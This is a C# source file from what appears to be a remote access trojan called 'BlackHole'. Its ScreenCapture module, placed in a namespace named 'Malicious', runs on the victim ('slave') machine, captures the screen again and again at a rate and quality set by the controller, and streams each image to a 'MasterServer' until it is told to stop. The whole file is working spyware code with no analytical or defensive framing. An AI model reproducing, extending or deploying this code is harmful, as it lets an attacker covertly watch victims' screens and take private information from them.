using System;
using System.Threading;
using System.Threading.Tasks;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Slave.Helper;

namespace BlackHole.Slave.Malicious
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class ScreenCapture : Singleton<ScreenCapture>, IMalicious
    {
        private CancellationTokenSource m_screenCaptureTokenSource;
        private bool IsCapturingScreen => !m_screenCaptureTokenSource.IsCancellationRequested;
        /// <summary>
        /// 
        /// </summary>
        public void Initialize()
        {
            m_screenCaptureTokenSource = new CancellationTokenSource();
            m_screenCaptureTokenSource.Cancel();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public void StartScreenCapture(StartScreenCaptureMessage message)
        {
            if (IsCapturingScreen)
                return;
            m_screenCaptureTokenSource = new CancellationTokenSource();

            MasterServer.Instance.SendStatus(message.WindowId, "Screen capture", "Started capturing...");

            // we dont assign it now so that we can use it in the lambda itself
            Action sendCapture = null;
            sendCapture = async () =>
            {
                try
                {
                    MasterServer.Instance.ExecuteComplexSendOperation(message.WindowId,
                        "Screen capture",
                        () => RemoteDesktopHelper.CaptureScreen(message.ScreenNumber, message.Quality));

                    m_screenCaptureTokenSource.Token.ThrowIfCancellationRequested();

                    // capture rate FPS
                    await Task.Delay(TimeSpan.FromMilliseconds(1000 / message.Rate));

                    // continue
                    await Task.Factory.StartNew(sendCapture, m_screenCaptureTokenSource.Token);
                }
                catch
                {
                    // cancelled
                    MasterServer.Instance.SendStatus(message.WindowId, "Screen capture", "Stopped capturing...");
                }
            };
            Task.Factory.StartNew(sendCapture, m_screenCaptureTokenSource.Token);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public void StopScreenCapture(StopScreenCaptureMessage message) => StopScreenCapture();

        /// <summary>
        /// 
        /// </summary>
        public void StopScreenCapture() => m_screenCaptureTokenSource.Cancel();
    }
}
